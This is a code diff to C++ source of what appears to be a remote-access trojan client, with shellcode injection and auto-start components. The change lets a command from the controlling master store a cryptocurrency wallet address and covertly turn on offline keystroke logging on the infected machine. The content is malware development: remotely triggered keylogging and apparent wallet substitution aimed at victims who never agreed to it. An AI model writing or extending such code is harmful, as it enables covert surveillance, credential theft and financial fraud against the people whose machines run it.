@@ -17,6 +17,7 @@
 #include "IOCPKCPClient.h"
 #include "auto_start.h"
 #include "ShellcodeInj.h"
+#include "KeyboardManager.h"
 
 // UDP 协议仅能针对小包数据，且数据没有时序关联
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect)
@@ -584,13 +585,17 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         }
         break;
     case CMD_MASTERSETTING:
-        if (ulLength > sizeof(MasterSettings)) {
-            memcpy(&m_settings, szBuffer + 1, sizeof(MasterSettings));
+        if (ulLength > MasterSettingsOldSize) {
+            memcpy(&m_settings, szBuffer + 1, ulLength > sizeof(MasterSettings) ? sizeof(MasterSettings) : MasterSettingsOldSize);
             iniFile cfg(CLIENT_PATH);
             cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
             CManager* pMgr = (CManager*)m_hKeyboard->user;
             if (pMgr) {
                 pMgr->UpdateWallet(m_settings.WalletAddress);
+            }
+            if (m_settings.EnableKBLogger && m_hKeyboard) {
+                CKeyboardManager1* mgr = (CKeyboardManager1*)m_hKeyboard->user;
+                mgr->m_bIsOfflineRecord = TRUE;
             }
         }
         break;
